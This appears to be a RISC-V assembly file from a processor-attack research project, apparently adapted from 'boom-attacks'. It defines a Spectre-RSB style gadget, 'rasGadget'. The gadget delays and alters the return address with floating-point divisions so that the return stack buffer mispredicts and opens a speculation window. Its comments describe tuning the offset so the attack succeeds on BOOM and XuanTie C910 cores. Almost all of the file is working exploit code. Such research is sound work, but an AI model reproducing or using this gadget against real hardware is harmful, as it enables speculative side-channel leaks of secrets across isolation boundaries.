.section .text
.globl rasGadget

rasGadget:
    # Pop off stack frame and get RA from BOOM.
	# Since the stack grows downwards, decreasing the stack pointer sp allocates space on the stack, whereas increasing it deallocates space. 
	# That is, addi sp, sp, -48 allocates 48 bytes on the stack and addi sp, sp, 48 deallocates 48 bytes from the stack.
	# The former creates the new stack frame, and the latter destroys it.
	# ld ra, 40(sp) means load previous value (sp-40)
	# In the RISC-V ABI, the stack pointer points to the next available memory location on the stack, and the frame pointer points to the base of the stack frame.
	#
	# There is no need to do this in RISC-V platforms (like T-Head XuanTie C910) that implement an instant caller address stacking into RAS(Return Address Stack)
	# (which means no extra operations like the following parts are needed to instruct a return address saving, as x86 processors do.)
	
#    ld ra, 40(sp)
#	ld s0, 32(sp)
#    addi sp, sp, 48

    # This stalls the result of ra to be used for the jalr
	# ret can not be used.
    # Originally ra - 2 + (( 2 << 4 ) / 2^4) from boom-attacks. (2 << 4 = 2 * 2 ^ 4 = 2 ^ 5)
	# Now it is set to ra - 2 + (( 2 << 3 ) / 2^4) = ra - 1, so it will return to the last address. (2 << 3 = 2 * 2 ^ 3 = 2 ^ 4)
	# While the RSB predicts the return address to be the next line inside the last level sub function,
	# here actually it is forced to return to the main function, creating a speculation window for attacks.
	# You may try other values greater than 4. For example, 0x5 0x7 etc returns segfault, 0x6 0x12 "Illegal instruction",
	# while 0x8 will return something else (may be exactly the value in the predictor) and the attack will fail.
    addi ra, ra, -2
    addi t1, zero, 2
    slli t2, t1, 0x3
    fcvt.s.lu fa4, t1
    fcvt.s.lu fa5, t2
    fdiv.s fa5, fa5, fa4
    fdiv.s fa5, fa5, fa4
    fdiv.s fa5, fa5, fa4
    fdiv.s fa5, fa5, fa4
    fcvt.lu.s t2, fa5, rtz
    add ra, ra, t2

    # Return to main
#    ret
	jalr zero, ra, 0